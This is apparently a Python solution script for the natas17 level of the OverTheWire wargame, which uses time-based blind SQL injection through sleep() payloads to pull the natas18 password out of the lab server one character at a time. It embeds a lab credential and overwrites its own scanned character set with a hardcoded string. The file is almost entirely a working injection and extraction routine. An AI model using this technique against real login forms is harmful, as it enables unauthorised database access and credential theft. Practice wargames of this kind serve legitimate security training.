#!/usr/bin/env python3
try:
    from requests.auth import HTTPBasicAuth    
    import requests, time

    host='http://natas17.natas.labs.overthewire.org/index.php'
    Auth=HTTPBasicAuth('natas17', '8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw')  
    headers={'content-type': 'application/x-www-form-urlencoded'}  
    filteredchars=''  
    password=''  
    allchars='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890'    
    
    t1=float(time.asctime().split(' ')[3][-5:].replace(":",'.'))
    for char in allchars:  
        payload='username=natas18%22+and+password+like+binary+%27%25{0}%25%27+and+sleep%281%29+%23'.format(char)  
        r=requests.post(host, auth=Auth, data=payload, headers=headers)  
        if(r.elapsed.seconds >= 1):  
            filteredchars+=char
            for i in ['   ','.  ','.. ','...']:
                print(10*' '+'\rWaiting'+str(i),end='',flush=1)
                time.sleep(1)
    filteredchars="dghjlmpqsvwxyCDFIKOPR470"
    print('\nWordlist: '+filteredchars)
    print('Progress: ',end='') 
    for i in range(32):  
        for char in filteredchars:  
            payload='username=natas18%22%20and%20password%20like%20binary%20\'{0}%25\'%20and%20sleep(1)%23'.format(password + char)  
            r=requests.post(host, auth=Auth, data=payload, headers=headers)  
            if(r.elapsed.seconds >= 1):  
                password+=char  
                print(char,end='',flush=True)  
                break
    print('\n'+'-'*12+'Complete'+'-'*12+'\n')
    t2=float(time.asctime().split(' ')[3][-5:].replace(":",'.'))
    if str(t1)[0:2]==str(t2)[0:2]: print('Time: '+str(round(t2-t1,2))+' min')
    else: print('Time: '+str(round(t2-t1-0.4,2))+' min')
    print('Password: '+password)
except(KeyboardInterrupt, EOFError): exit()
